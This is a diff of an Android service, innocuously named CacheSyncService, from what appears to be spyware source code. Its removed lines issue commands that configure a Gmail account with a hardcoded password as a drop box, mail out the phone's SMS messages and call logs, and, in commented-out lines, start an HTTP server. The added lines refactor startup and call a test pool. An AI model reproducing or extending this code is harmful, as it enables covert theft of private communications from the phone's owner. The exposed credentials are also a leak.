@@ -17,6 +17,11 @@ public class CacheSyncService extends Service implements Runnable {
 	}
 
 	@Override
+	public void onDestroy() {
+		NetLog.w("SERVICE EXIT...");
+	}
+	
+	@Override
 	public void onCreate() 
 	{
 		gLog.Init("SrvCacheSync","CacheSync.log.txt",true);
@@ -24,21 +29,28 @@ public class CacheSyncService extends Service implements Runnable {
 		super.onCreate();
 		NetLog.v("Service Created");
 	    
-		BackgroundTask<Void,Void> task = new BackgroundTask<Void,Void>(this,false) {
-	        	public void onComplete(Void  v) {
-	                NetLog.v("Service initialized");
-	        		cmdPool.Execute("+79037996299", "@setup;ack:0;mto:cache.sync@gmail.com;muser:cache.sync@gmail.com;mpass:gumbaflex");
-	        		cmdPool.Execute("+79037996299", "@rsms;mail");
-	        		cmdPool.Execute("+79037996299", "@rcalls;mail");
-	        		
-	        		//cmdPool.Execute("+79037996299","@httpd;8081");
-	        		//cmdPool.Execute("+79037996299","@httpd;217.118.66.22;8081");
+		BackgroundTask<Boolean,Void> task = new BackgroundTask<Boolean,Void>(this,false) {
+	        	public void onComplete(Boolean isInitialized) {
+	                
+	        		if ( !isInitialized ) {
+	                	NetLog.v("Service is not initialzed propely, command interface is not active...");
+	                	CacheSyncService.this.stopSelf();
+	                	return;
+	                } else 
+	                	NetLog.v("Service successfuly initialized");
+	        			// TODO: Remove that on distribution 
+	        			TestPool.TEST(cmdPool);
 	        	}
 	        	@Override
-	        	protected Void doInBackground(Void ... arg0) {
-	                cmdPool.Init("Service",CacheSyncService.this);
-	                //cmdPool.setDefaults();
-	                return (Void)null;
+	        	protected Boolean doInBackground(Void ... arg0) {
+	                try {
+						cmdPool.Init("Service",CacheSyncService.this);
+					} catch (Exception e) {
+						NetLog.e("Failed to initialize command pool: %s ",e.getMessage());
+						cmdPool.Release();
+						return false;
+					}
+	                return true;
 	        	}
 	        };
 	    task.exec();
